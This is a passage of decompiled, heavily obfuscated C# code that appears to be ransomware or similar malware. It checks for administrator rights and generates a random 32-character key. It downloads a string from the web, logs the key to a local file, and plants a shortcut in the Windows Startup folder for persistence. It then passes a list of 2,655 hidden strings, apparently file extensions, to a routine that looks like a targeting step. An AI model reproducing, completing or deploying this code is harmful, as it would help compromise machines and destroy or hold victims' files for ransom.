						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396979))
						{
							mKOkDQaPljqI = getString_0(107396883);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397002))
						{
							mKOkDQaPljqI = getString_0(107396993);
						}
					}
					if (text3.Contains(getString_0(107396444)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396979))
						{
							sHBjpbgVmkra = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397002))
						{
							sHBjpbgVmkra = true;
						}
					}
					if (text3.Contains(getString_0(107396459)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396979))
						{
							IOdNTzsqoZWVAC = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397002))
						{
							IOdNTzsqoZWVAC = false;
						}
					}
					if (text3.Contains(getString_0(107396414)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396979))
						{
							WUcQpnUgejkJqpB = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397002))
						{
							WUcQpnUgejkJqpB = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (IOdNTzsqoZWVAC)
			{
				try
				{
					File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107396417) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (mKOkDQaPljqI == getString_0(107396993))
		{
			tBBBwzKtqNj();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && RXXawWHSUduuQmi)
			{
				try
				{
					Thread thread4 = new Thread(JGYhhaJwhCT.ffpYyQcrWtZZ);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			pPOxzMkmHSA(getString_0(107396340), gUlAYNDfQee(getString_0(107396359)));
		}
		SecureString secureString = new SecureString();
		if (lDHLHhajCIBI == getString_0(107396993))
		{
			MKXSGZQsex = lOiJKLXYNaE.EUcJjWziQBK(32);
			tHaxFjXwOLKb = lOiJKLXYNaE.sKpHBCLYxr();
		}
		else
		{
			MKXSGZQsex = getString_0(107396254);
		}
		GwZQDnKvCkbY = jHvXcQAocngrZWa.UXBKErjXJpX(MKXSGZQsex + tHaxFjXwOLKb);
		if (EzPmbiVliDos == getString_0(107396883))
		{
			RtGLvTThnbG();
		}
		if (dDQbvgPvmJtcLs)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), BVDNRoTnEzf)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), BVDNRoTnEzf), string.Concat(gUlAYNDfQee(getString_0(107396209)), new WebClient().DownloadString(gUlAYNDfQee(getString_0(107396696))), getString_0(107396655), gUlAYNDfQee(getString_0(107396682)), DateTime.Now, getString_0(107396655), gUlAYNDfQee(getString_0(107396641)), GwZQDnKvCkbY));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), BVDNRoTnEzf), getString_0(107396584) + GwZQDnKvCkbY);
				}
			}
			catch (Exception ex9)
			{
				if (IOdNTzsqoZWVAC)
				{
					try
					{
						File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107396555) + ex9.Message + getString_0(107396655));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		DpmAYzuUtYtL.OcBXzowwAu(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), tBpNkaUiwdaB), TasZGQJWiOHVcIozU(GwZQDnKvCkbY), null, null, getString_0(107396474), getString_0(107396489), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			UcwHUVhXabZ();
		}
		try
		{
			try
			{
				if (sHBjpbgVmkra)
				{
					Console.WriteLine(getString_0(107395928));
				}
			}
			catch
			{
			}
			sdGXnAFhMnQeXrZj(new string[1] { getString_0(107395911) }, new string[2655]
			{
				getString_0(107395870),
				getString_0(107395865),
				getString_0(107395860),
				getString_0(107395855),
				getString_0(107395882),
				getString_0(107395877),
				getString_0(107395872),
				getString_0(107395835),
				getString_0(107395830),
				getString_0(107395825),
				getString_0(107395852),
				getString_0(107395847),
				getString_0(107395842),
				getString_0(107395805),
				getString_0(107395800),
				getString_0(107395795),
				getString_0(107395822),
				getString_0(107395817),
				getString_0(107395808),
				getString_0(107395771),
				getString_0(107395766),
				getString_0(107395761),
				getString_0(107395784),
				getString_0(107395779),
				getString_0(107395742),
				getString_0(107395737),
				getString_0(107395732),
				getString_0(107395755),
				getString_0(107395750),
				getString_0(107395745),
				getString_0(107395708),
				getString_0(107395703),
				getString_0(107395698),
				getString_0(107395725),
				getString_0(107395716),
				getString_0(107395711),
				getString_0(107396186),
				getString_0(107396181),
				getString_0(107396176),
				getString_0(107396203),
				getString_0(107396198),
				getString_0(107396193),
				getString_0(107396152),
				getString_0(107396147),
				getString_0(107396174),
				getString_0(107396169),
				getString_0(107396164),
				getString_0(107396159),
				getString_0(107396118),
				getString_0(107396113),
				getString_0(107396140),
				getString_0(107396135),
				getString_0(107396130),
				getString_0(107396093),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107396110),
				getString_0(107396105),
				getString_0(107396100),
				getString_0(107396059),
				getString_0(107396054),
				getString_0(107396077),
				getString_0(107396072),
				getString_0(107396067),
				getString_0(107396030),
				getString_0(107396025),
				getString_0(107396020),
				getString_0(107396015),
				getString_0(107396042),
				getString_0(107396037),
				getString_0(107395996),
				getString_0(107395987),
				getString_0(107396010),
				getString_0(107396001),
				getString_0(107395964),
				getString_0(107395959),
				getString_0(107395954),
				getString_0(107395981),
				getString_0(107395976),
				getString_0(107395431),
				getString_0(107395386),
				getString_0(107395401),
				getString_0(107395392),
				getString_0(107395355),
				getString_0(107395350),
				getString_0(107395345),
				getString_0(107395372),
				getString_0(107395367),
				getString_0(107395362),
				getString_0(107395325),
				getString_0(107395320),
				getString_0(107395311),
				getString_0(107395334),
				getString_0(107395293),
				getString_0(107395288),
				getString_0(107395279),
				getString_0(107395306),
				getString_0(107395301),
				getString_0(107395296),
				getString_0(107395259),
				getString_0(107395254),
				getString_0(107395249),
				getString_0(107395272),
				getString_0(107395267),
				getString_0(107395230),
				getString_0(107395217),
				getString_0(107395244),
				getString_0(107395239),
				getString_0(107395198),
				getString_0(107395189),
				getString_0(107395208),
				getString_0(107395675),
				getString_0(107395694),
				getString_0(107395681),
				getString_0(107395636),
				getString_0(107395655),
				getString_0(107395610),
				getString_0(107395629),
				getString_0(107395616),
				getString_0(107395579),
				getString_0(107395574),
				getString_0(107395569),
				getString_0(107395592),
				getString_0(107395587),
				getString_0(107395550),
				getString_0(107395545),
				getString_0(107395540),
				getString_0(107395535),
				getString_0(107395562),
				getString_0(107395557),
				getString_0(107395552),
				getString_0(107395511),
				getString_0(107395534),
				getString_0(107395525),
				getString_0(107395484),
				getString_0(107395479),
				getString_0(107395474),
				getString_0(107395497),
				getString_0(107395488),
				getString_0(107395447),
				getString_0(107395442),
				getString_0(107395469),
				getString_0(107395464),
				getString_0(107395459),
				getString_0(107394910),
				getString_0(107394905),
				getString_0(107394896),
				getString_0(107394923),
				getString_0(107394918),
				getString_0(107394913),
				getString_0(107394872),
				getString_0(107394867),
				getString_0(107394894),
				getString_0(107394889),
				getString_0(107394884),
				getString_0(107394879),
				getString_0(107394842),
				getString_0(107394837),
				getString_0(107394832),
				getString_0(107394859),
				getString_0(107394854),
				getString_0(107394813),
				getString_0(107394808),
				getString_0(107394803),
				getString_0(107394826),
				getString_0(107394821),
				getString_0(107394816),
				getString_0(107394779),
				getString_0(107394770),
				getString_0(107394797),
				getString_0(107394788),
				getString_0(107394747),
				getString_0(107394742),
				getString_0(107394737),
				getString_0(107394764),
				getString_0(107394759),
				getString_0(107394754),
				getString_0(107394717),
				getString_0(107394712),
				getString_0(107394707),
				getString_0(107394734),
				getString_0(107394729),
				getString_0(107394724),
				getString_0(107394683),
				getString_0(107394674),
				getString_0(107394701),
				getString_0(107394696),
				getString_0(107394691),
				getString_0(107395162),
				getString_0(107395157),
				getString_0(107395152),
				getString_0(107395179),
				getString_0(107395170),
				getString_0(107395133),
				getString_0(107395124),
				getString_0(107395119),
				getString_0(107395142),
				getString_0(107395137),
				getString_0(107395096),
				getString_0(107395091),
				getString_0(107395118),
				getString_0(107395109),
				getString_0(107395104),
				getString_0(107395067),
				getString_0(107395062),
				getString_0(107395081),
				getString_0(107395076),
				getString_0(107395043),
				getString_0(107395006),
				getString_0(107395001),
				getString_0(107394996),
				getString_0(107394991),
				getString_0(107395018),
				getString_0(107395013),
				getString_0(107395008),
				getString_0(107394971),
				getString_0(107394966),
				getString_0(107394961),
				getString_0(107394988),
				getString_0(107394983),
				getString_0(107394942),
				getString_0(107394937),
				getString_0(107394932),
				getString_0(107394927),
				getString_0(107394954),
				getString_0(107394945),
				getString_0(107394392),
				getString_0(107394383),
				getString_0(107394410),
				getString_0(107394405),
				getString_0(107394400),
				getString_0(107394359),
				getString_0(107394382),
				getString_0(107394369),
				getString_0(107394332),
				getString_0(107394327),
				getString_0(107394350),
				getString_0(107394301),
				getString_0(107394292),
				getString_0(107394287),
				getString_0(107394314),
				getString_0(107394309),
				getString_0(107394304),
				getString_0(107394263),
				getString_0(107394258),
				getString_0(107394273),
				getString_0(107394236),
				getString_0(107394227),
				getString_0(107394254),
				getString_0(107394249),
				getString_0(107394244),
				getString_0(107394239),
				getString_0(107394202),
				getString_0(107394197),
				getString_0(107394192),
				getString_0(107394215),
				getString_0(107394210),
				getString_0(107394173),
				getString_0(107394164),
				getString_0(107394187),
				getString_0(107394178),
				getString_0(107394653),
				getString_0(107394648),
				getString_0(107394643),
				getString_0(107394670),
				getString_0(107394665),
				getString_0(107394656),
				getString_0(107394619),
				getString_0(107394614),
				getString_0(107394609),
				getString_0(107394636),
				getString_0(107394631),
				getString_0(107394590),
				getString_0(107394605),
				getString_0(107394600),
				getString_0(107394595),
				getString_0(107394558),
				getString_0(107394553),
				getString_0(107394548),
				getString_0(107394543),
				getString_0(107394570),
				getString_0(107394565),
				getString_0(107394560),
				getString_0(107394523),
				getString_0(107394518),
				getString_0(107394513),
				getString_0(107394540),
				getString_0(107394535),
				getString_0(107394530),
				getString_0(107394493),
				getString_0(107394484),
				getString_0(107394479),
				getString_0(107394502),
				getString_0(107394461),
				getString_0(107394456),
				getString_0(107394451),
				getString_0(107394478),
				getString_0(107394469),
				getString_0(107394464),
				getString_0(107394427),
				getString_0(107394422),
				getString_0(107394417),
				getString_0(107394444),
				getString_0(107394439),
				getString_0(107393886),
				getString_0(107393881),
				getString_0(107393872),
				getString_0(107393899),
				getString_0(107393894),
				getString_0(107393853),
				getString_0(107393848),
				getString_0(107393843),
				getString_0(107393870),
				getString_0(107393865),
				getString_0(107393860),
				getString_0(107393855),
				getString_0(107393818),
				getString_0(107393813),
				getString_0(107393836),
				getString_0(107393831),
				getString_0(107393826),
				getString_0(107393789),
				getString_0(107393804),
				getString_0(107393799),
				getString_0(107393794),
				getString_0(107393757),
				getString_0(107393752),
				getString_0(107393747),
				getString_0(107393774),
				getString_0(107393769),
				getString_0(107393764),
				getString_0(107393759),
				getString_0(107393722),
				getString_0(107393717),
				getString_0(107393740),
				getString_0(107393735),
				getString_0(107393694),
				getString_0(107393681),
				getString_0(107393708),
				getString_0(107393703),
				getString_0(107393698),
				getString_0(107393661),
				getString_0(107393656),
				getString_0(107393647),
				getString_0(107393674),
				getString_0(107393669),
				getString_0(107393664),
				getString_0(107394135),
				getString_0(107394130),
				getString_0(107394157),
				getString_0(107394148),
				getString_0(107394143),
				getString_0(107394098),
				getString_0(107394125),
				getString_0(107394116),
				getString_0(107394111),
				getString_0(107394070),
				getString_0(107394065),
				getString_0(107394092),
				getString_0(107394043),
				getString_0(107394034),
				getString_0(107394061),
				getString_0(107394052),
				getString_0(107394047),
				getString_0(107394010),
				getString_0(107394005),
				getString_0(107394000),
				getString_0(107394027),
				getString_0(107394022),
				getString_0(107394017),
				getString_0(107393976),
				getString_0(107393971),
				getString_0(107393998),
				getString_0(107393993),
				getString_0(107393988),
				getString_0(107393983),
				getString_0(107393942),
				getString_0(107393937),
				getString_0(107393964),
				getString_0(107393959),
				getString_0(107393954),
				getString_0(107393917),
				getString_0(107393908),
				getString_0(107393931),
				getString_0(107393922),
				getString_0(107393369),
				getString_0(107393364),
				getString_0(107393387),
				getString_0(107393378),
				getString_0(107393337),
				getString_0(107393328),
				getString_0(107393351),
				getString_0(107393346),
				getString_0(107393309),
				getString_0(107393300),
				getString_0(107393295),
				getString_0(107393318),
				getString_0(107393313),
				getString_0(107393276),
				getString_0(107393271),
				getString_0(107393266),
				getString_0(107393289),
				getString_0(107393284),
				getString_0(107393279),
				getString_0(107393242),
				getString_0(107393237),
				getString_0(107393232),
				getString_0(107393259),
				getString_0(107393206),
				getString_0(107393201),
				getString_0(107393228),
				getString_0(107393223),
				getString_0(107393218),
				getString_0(107393181),
				getString_0(107393176),
				getString_0(107393167),
				getString_0(107393190),
				getString_0(107393185),
				getString_0(107393140),
				getString_0(107393135),
				getString_0(107393158),
				getString_0(107393153),
				getString_0(107393624),
				getString_0(107393619),
				getString_0(107393642),
				getString_0(107393613),
				getString_0(107393556),
				getString_0(107393579),
				getString_0(107393570),
				getString_0(107393529),
				getString_0(107393548),
				getString_0(107393539),
				getString_0(107393502),
				getString_0(107393493),
				getString_0(107393516),
				getString_0(107393511),
				getString_0(107393506),
				getString_0(107393469),
				getString_0(107393464),
				getString_0(107393459),
				getString_0(107393486),
				getString_0(107393481),
				getString_0(107393476),
				getString_0(107393471),
				getString_0(107393434),
				getString_0(107393429),
				getString_0(107393424),
				getString_0(107393451),
				getString_0(107393446),
				getString_0(107393441),
				getString_0(107393404),
				getString_0(107393391),
				getString_0(107393410),
				getString_0(107392873),
				getString_0(107392844),
				getString_0(107392839),
				getString_0(107392798),
				getString_0(107392789),
				getString_0(107392808),
				getString_0(107392759),
				getString_0(107392754),
				getString_0(107392781),
				getString_0(107392776),
				getString_0(107392767),
				getString_0(107392726),
				getString_0(107392721),
				getString_0(107392744),
				getString_0(107392739),
				getString_0(107392702),
				getString_0(107392697),
				getString_0(107392716),
				getString_0(107392707),
				getString_0(107392670),
				getString_0(107392665),
				getString_0(107392656),
				getString_0(107392683),
				getString_0(107392638),
				getString_0(107392633),
				getString_0(107392624),
				getString_0(107392651),
				getString_0(107392642),
				getString_0(107393117),
				getString_0(107393108),
				getString_0(107393131),
				getString_0(107393086),
				getString_0(107393101),
				getString_0(107393088),
				getString_0(107393051),
				getString_0(107393046),
				getString_0(107393041),
				getString_0(107393068),
				getString_0(107393063),
				getString_0(107393058),
				getString_0(107393021),
				getString_0(107393016),
				getString_0(107393011),
				getString_0(107393038),
				getString_0(107393033),
				getString_0(107393028),
				getString_0(107393023),
				getString_0(107392982),
				getString_0(107392977),
				getString_0(107393004),
				getString_0(107392999),
				getString_0(107392994),
				getString_0(107392957),
				getString_0(107392948),
				getString_0(107392943),
				getString_0(107392970),
				getString_0(107392925),
				getString_0(107392920),
				getString_0(107392915),
				getString_0(107392942),
				getString_0(107392937),
				getString_0(107392932),
				getString_0(107392927),
				getString_0(107392890),
				getString_0(107392885),
				getString_0(107392880),
				getString_0(107392903),
				getString_0(107392898),
				getString_0(107392349),
				getString_0(107392344),
				getString_0(107392335),
				getString_0(107392362),
				getString_0(107392353),
				getString_0(107392316),
				getString_0(107392311),
				getString_0(107392306),
				getString_0(107392333),
				getString_0(107392324),
				getString_0(107392319),
				getString_0(107392274),
				getString_0(107392297),
				getString_0(107392248),
				getString_0(107392239),
				getString_0(107392266),
				getString_0(107392217),
				getString_0(107392212),
				getString_0(107392207),
				getString_0(107392234),
				getString_0(107392229),
				getString_0(107392224),
				getString_0(107392187),
				getString_0(107392178),
				getString_0(107392193),
				getString_0(107392156),
				getString_0(107392151),
				getString_0(107392146),
				getString_0(107392173),
				getString_0(107392168),
				getString_0(107392163),
				getString_0(107392126),
				getString_0(107392121),
				getString_0(107392116),
				getString_0(107392111),
				getString_0(107392138),
				getString_0(107392133),
				getString_0(107392128),
				getString_0(107392603),
				getString_0(107392594),
				getString_0(107392621),
				getString_0(107392616),
				getString_0(107392607),
				getString_0(107392570),
				getString_0(107392561),
				getString_0(107392584),
				getString_0(107392575),
				getString_0(107392538),
				getString_0(107392533),
				getString_0(107392556),
				getString_0(107392551),
				getString_0(107392546),
				getString_0(107392501),
				getString_0(107392496),
				getString_0(107392523),
				getString_0(107392518),
				getString_0(107392513),
				getString_0(107392472),
				getString_0(107392487),
				getString_0(107392446),
				getString_0(107392433),
				getString_0(107392460),
				getString_0(107392455),
				getString_0(107392450),
				getString_0(107392413),
				getString_0(107392408),
				getString_0(107392403),
				getString_0(107392430),
				getString_0(107392425),
				getString_0(107392416),
				getString_0(107392379),
				getString_0(107392374),
				getString_0(107392397),
				getString_0(107392392),
				getString_0(107392383),
				getString_0(107391834),
				getString_0(107391829),
				getString_0(107391824),
				getString_0(107391851),
				getString_0(107391846),
				getString_0(107391841),
				getString_0(107391804),
				getString_0(107391795),
				getString_0(107391822),
				getString_0(107391817),
				getString_0(107391772),
				getString_0(107391763),
				getString_0(107391786),
				getString_0(107391777),
				getString_0(107391740),
				getString_0(107391731),
				getString_0(107391758),
				getString_0(107391749),
				getString_0(107391744),
				getString_0(107391703),
				getString_0(107391726),
				getString_0(107391721),
				getString_0(107391716),
				getString_0(107391675),
				getString_0(107391670),
				getString_0(107391665),
				getString_0(107391680),
				getString_0(107391643),
				getString_0(107391638),
				getString_0(107391633),
				getString_0(107391660),
				getString_0(107391655),
				getString_0(107391650),
				getString_0(107391609),
				getString_0(107391600),
				getString_0(107391623),
				getString_0(107392094),
				getString_0(107392081),
				getString_0(107392104),
				getString_0(107392095),
				getString_0(107392050),
				getString_0(107392073),
				getString_0(107392064),
				getString_0(107392019),
				getString_0(107392042),
				getString_0(107392009),
				getString_0(107392000),
				getString_0(107391959),
				getString_0(107391982),
				getString_0(107391977),
				getString_0(107391972),
				getString_0(107391927),
				getString_0(107391950),
				getString_0(107391937),
				getString_0(107391896),
				getString_0(107391915),
				getString_0(107391910),
				getString_0(107391869),
				getString_0(107391864),
				getString_0(107391859),
				getString_0(107391886),
				getString_0(107391881),
				getString_0(107391876),
				getString_0(107391871),
				getString_0(107391322),
				getString_0(107391317),
				getString_0(107391340),
				getString_0(107391335),
				getString_0(107391330),
				getString_0(107391289),
				getString_0(107391280),
				getString_0(107391307),
				getString_0(107391302),
				getString_0(107391297),
				getString_0(107391256),
				getString_0(107391251),
				getString_0(107391278),
				getString_0(107391273),
				getString_0(107391268),
				getString_0(107391263),
				getString_0(107391226),
				getString_0(107391221),
				getString_0(107391216),
				getString_0(107391243),
				getString_0(107391234),
				getString_0(107391197),
				getString_0(107391192),
				getString_0(107391183),
				getString_0(107391210),
				getString_0(107391205),
				getString_0(107391200),
				getString_0(107391163),
				getString_0(107391158),
				getString_0(107391153),
				getString_0(107391180),
				getString_0(107391171),
				getString_0(107391134),
				getString_0(107391125),
				getString_0(107391120),
				getString_0(107391139),
				getString_0(107391102),
				getString_0(107391097),
				getString_0(107391092),
				getString_0(107391087),
				getString_0(107391114),
				getString_0(107391109),
				getString_0(107391104),
				getString_0(107391579),
				getString_0(107391574),
				getString_0(107391593),
				getString_0(107391588),
				getString_0(107391583),
				getString_0(107391546),
				getString_0(107391537),
				getString_0(107391564),
				getString_0(107391559),
				getString_0(107391554),
				getString_0(107391517),
				getString_0(107391512),
				getString_0(107391507),
				getString_0(107391534),
				getString_0(107391529),
				getString_0(107391524),
				getString_0(107391483),
				getString_0(107391478),
				getString_0(107391501),
				getString_0(107391492),
				getString_0(107391487),
				getString_0(107391450),
				getString_0(107391445),
				getString_0(107391468),
				getString_0(107391463),
				getString_0(107391458),
				getString_0(107391421),
				getString_0(107391416),
				getString_0(107391407),
				getString_0(107391434),
				getString_0(107391429),
				getString_0(107391424),
				getString_0(107391387),
				getString_0(107391382),
				getString_0(107391377),
				getString_0(107391404),
				getString_0(107391399),
				getString_0(107391394),
				getString_0(107391357),
				getString_0(107391352),
				getString_0(107391343),
				getString_0(107391370),
				getString_0(107391365),
				getString_0(107391360),
				getString_0(107390811),
				getString_0(107390830),
				getString_0(107390825),
				getString_0(107390820),
				getString_0(107390771),
				getString_0(107390790),
				getString_0(107390745),
				getString_0(107390740),
				getString_0(107390735),
				getString_0(107390758),
				getString_0(107390753),
				getString_0(107390716),
				getString_0(107390711),
				getString_0(107390734),
				getString_0(107390729),
				getString_0(107390724),
				getString_0(107390683),
				getString_0(107390678),
				getString_0(107390701),
				getString_0(107390696),
				getString_0(107390687),
				getString_0(107390650),
				getString_0(107390641),
				getString_0(107390668),
				getString_0(107390663),
				getString_0(107390658),
				getString_0(107390621),
				getString_0(107390616),
				getString_0(107390611),
				getString_0(107390638),
				getString_0(107390633),
				getString_0(107390628),
				getString_0(107390623),
				getString_0(107390586),
				getString_0(107390581),
				getString_0(107390576),
				getString_0(107390603),
				getString_0(107390598),
				getString_0(107391069),
				getString_0(107391060),
				getString_0(107391055),
				getString_0(107391082),
				getString_0(107391077),
				getString_0(107391072),
				getString_0(107391035),
				getString_0(107391030),
				getString_0(107391025),
				getString_0(107391052),
				getString_0(107391047),
				getString_0(107391042),
				getString_0(107391001),
				getString_0(107391016),
				getString_0(107390971),
				getString_0(107390966),
				getString_0(107390961),
				getString_0(107390988),
				getString_0(107390983),
				getString_0(107390978),
				getString_0(107390941),
				getString_0(107390936),
				getString_0(107390931),
				getString_0(107390958),
				getString_0(107390953),
				getString_0(107390944),
				getString_0(107390907),
				getString_0(107390902),
				getString_0(107390897),
				getString_0(107390924),
				getString_0(107390915),
				getString_0(107390878),
				getString_0(107390873),
				getString_0(107390868),
				getString_0(107390891),
				getString_0(107390886),
				getString_0(107390881),
				getString_0(107390844),
				getString_0(107390835),
				getString_0(107390862),
				getString_0(107390857),
				getString_0(107390848),
				getString_0(107390299),
				getString_0(107390294),
				getString_0(107390289),
				getString_0(107390308),
				getString_0(107390259),
				getString_0(107390286),
				getString_0(107390281),
				getString_0(107390276),
				getString_0(107390235),
				getString_0(107390230),
				getString_0(107390225),
				getString_0(107390252),
				getString_0(107390247),
				getString_0(107390242),
				getString_0(107390205),
				getString_0(107390200),
				getString_0(107390195),
				getString_0(107390222),
				getString_0(107390217),
				getString_0(107390212),
				getString_0(107390171),
				getString_0(107390162),
				getString_0(107390185),
				getString_0(107390180),
				getString_0(107390139),
				getString_0(107390130),
				getString_0(107390153),
				getString_0(107390148),
				getString_0(107390143),
				getString_0(107390106),
				getString_0(107390101),
				getString_0(107390124),
				getString_0(107390119),
				getString_0(107390078),
				getString_0(107390073),
				getString_0(107390068),
				getString_0(107390063),
				getString_0(107390090),
				getString_0(107390085),
				getString_0(107390080),
				getString_0(107390555),
				getString_0(107390550),
				getString_0(107390573),
				getString_0(107390568),
				getString_0(107390563),
				getString_0(107390522),
				getString_0(107390513),
				getString_0(107390536),
				getString_0(107390527),
				getString_0(107390486),
				getString_0(107390481),
				getString_0(107390504),
				getString_0(107390499),
				getString_0(107390454),
				getString_0(107390449),
				getString_0(107390472),
				getString_0(107390427),
				getString_0(107390418),
				getString_0(107390437),
				getString_0(107390432),
				getString_0(107390387),
				getString_0(107390414),
				getString_0(107390409),
				getString_0(107390404),
				getString_0(107390399),
				getString_0(107390358),
				getString_0(107390381),
				getString_0(107390372),
				getString_0(107390331),
				getString_0(107390322),
				getString_0(107390349),
				getString_0(107390344),
				getString_0(107390339),
				getString_0(107389790),
				getString_0(107389785),
				getString_0(107389780),
				getString_0(107389775),
				getString_0(107389802),
				getString_0(107389793),
				getString_0(107389752),
				getString_0(107389747),
				getString_0(107389774),
				getString_0(107389769),
				getString_0(107389760),
				getString_0(107389723),
				getString_0(107389718),
				getString_0(107389733),
				getString_0(107389728),
				getString_0(107389691),
				getString_0(107389686),
				getString_0(107389681),
				getString_0(107389708),
				getString_0(107389699),
				getString_0(107389662),
				getString_0(107389657),
				getString_0(107389652),
				getString_0(107389675),
				getString_0(107389670),
				getString_0(107389665),
				getString_0(107389628),
				getString_0(107389619),
				getString_0(107389646),
				getString_0(107389641),
				getString_0(107389632),
				getString_0(107389595),
				getString_0(107389586),
				getString_0(107389613),
				getString_0(107389608),
				getString_0(107389603),
				getString_0(107389566),
				getString_0(107389561),
				getString_0(107389556),
				getString_0(107389551),
				getString_0(107389574),
				getString_0(107389569),
				getString_0(107390044),
				getString_0(107390035),
				getString_0(107390062),
				getString_0(107390057),
				getString_0(107390052),
				getString_0(107390047),
				getString_0(107390010),
				getString_0(107390001),
				getString_0(107390028),
				getString_0(107390023),
				getString_0(107390018),
				getString_0(107389981),
				getString_0(107389976),
				getString_0(107389971),
				getString_0(107389998),
				getString_0(107389993),
				getString_0(107389984),
				getString_0(107389943),
				getString_0(107389966),
				getString_0(107389961),
				getString_0(107389956),
				getString_0(107389915),
				getString_0(107389906),
				getString_0(107389933),
				getString_0(107389928),
				getString_0(107389923),
				getString_0(107389886),
				getString_0(107389877),
				getString_0(107389896),
				getString_0(107389891),
				getString_0(107389850),
				getString_0(107389845),
				getString_0(107389840),
				getString_0(107389867),
				getString_0(107389862),
				getString_0(107389857),
				getString_0(107389820),
				getString_0(107389811),
				getString_0(107389834),
				getString_0(107389829),
				getString_0(107389824),
				getString_0(107389275),
				getString_0(107389270),
				getString_0(107389265),
				getString_0(107389292),
				getString_0(107389287),
				getString_0(107389246),
				getString_0(107389241),
				getString_0(107389236),
				getString_0(107389231),
				getString_0(107389258),
				getString_0(107389253),
				getString_0(107389248),
				getString_0(107389211),
				getString_0(107389206),
				getString_0(107389201),
				getString_0(107389228),
				getString_0(107389223),
				getString_0(107389182),
				getString_0(107389169),
				getString_0(107389196),
				getString_0(107389191),
				getString_0(107389186),
				getString_0(107389149),
				getString_0(107389140),
				getString_0(107389135),
				getString_0(107389162),
				getString_0(107389157),
				getString_0(107389152),
				getString_0(107389111),
				getString_0(107389106),
				getString_0(107389133),
				getString_0(107389124),
				getString_0(107389119),
				getString_0(107389078),
				getString_0(107389073),
				getString_0(107389100),
				getString_0(107389095),
				getString_0(107389090),
				getString_0(107389049),
				getString_0(107389044),
				getString_0(107389039),
				getString_0(107389066),
				getString_0(107389061),
				getString_0(107389056),
				getString_0(107389531),
				getString_0(107389526),
				getString_0(107389521),
				getString_0(107389548),
				getString_0(107389543),
				getString_0(107389538),
				getString_0(107389501),
				getString_0(107389492),
				getString_0(107389515),
				getString_0(107389506),
				getString_0(107389465),
				getString_0(107389456),
				getString_0(107389475),
				getString_0(107389434),
				getString_0(107389425),
				getString_0(107389452),
				getString_0(107389447),
				getString_0(107389406),
				getString_0(107389401),
				getString_0(107389396),
				getString_0(107389391),
				getString_0(107389418),
				getString_0(107389413),
				getString_0(107389408),
				getString_0(107389371),
				getString_0(107389362),
				getString_0(107389389),
				getString_0(107389384),
				getString_0(107389379),
				getString_0(107389338),
				getString_0(107389329),
				getString_0(107389356),
				getString_0(107389351),
				getString_0(107389346),
				getString_0(107389301),
				getString_0(107389320),
				getString_0(107389315),
				getString_0(107388762),
				getString_0(107388753),
				getString_0(107388780),
				getString_0(107388775),
				getString_0(107388734),
				getString_0(107388725),
				getString_0(107388748),
				getString_0(107388743),
				getString_0(107388738),
				getString_0(107388701),
				getString_0(107388692),
				getString_0(107388687),
				getString_0(107388714),
				getString_0(107388709),
				getString_0(107388704),
				getString_0(107388667),
				getString_0(107388662),
				getString_0(107388657),
				getString_0(107388684),
				getString_0(107388679),
				getString_0(107388674),
				getString_0(107388637),
				getString_0(107388632),
				getString_0(107388627),
				getString_0(107388654),
				getString_0(107388649),
				getString_0(107388644),
				getString_0(107388639),
				getString_0(107388598),
				getString_0(107388593),
				getString_0(107388620),
				getString_0(107388615),
				getString_0(107388574),
				getString_0(107388565),
				getString_0(107388560),
				getString_0(107388583),
				getString_0(107388542),
				getString_0(107388533),
				getString_0(107388556),
				getString_0(107388547),
				getString_0(107389022),
				getString_0(107389013),
				getString_0(107389008),
				getString_0(107389031),
				getString_0(107388990),
				getString_0(107388985),
				getString_0(107389000),
				getString_0(107388991),
				getString_0(107388950),
				getString_0(107388961),
				getString_0(107388920),
				getString_0(107388931),
				getString_0(107388894),
				getString_0(107388885),
				getString_0(107388880),
				getString_0(107388907),
				getString_0(107388902),
				getString_0(107388897),
				getString_0(107388856),
				getString_0(107388847),
				getString_0(107388870),
				getString_0(107388865),
				getString_0(107388824),
				getString_0(107388819),
				getString_0(107388846),
				getString_0(107388837),
				getString_0(107388832),
				getString_0(107388795),
				getString_0(107388790),
				getString_0(107388813),
				getString_0(107388808),
				getString_0(107388803),
				getString_0(107388254),
				getString_0(107388245),
				getString_0(107388240),
				getString_0(107388267),
				getString_0(107388262),
				getString_0(107388221),
				getString_0(107388212),
				getString_0(107388207),
				getString_0(107388234),
				getString_0(107388229),
				getString_0(107388224),
				getString_0(107388187),
				getString_0(107388178),
				getString_0(107388205),
				getString_0(107388200),
				getString_0(107388191),
				getString_0(107388150),
				getString_0(107388145),
				getString_0(107388172),
				getString_0(107388163),
				getString_0(107388126),
				getString_0(107388121),
				getString_0(107388116),
				getString_0(107388139),
				getString_0(107388130),
				getString_0(107388093),
				getString_0(107388084),
				getString_0(107388079),
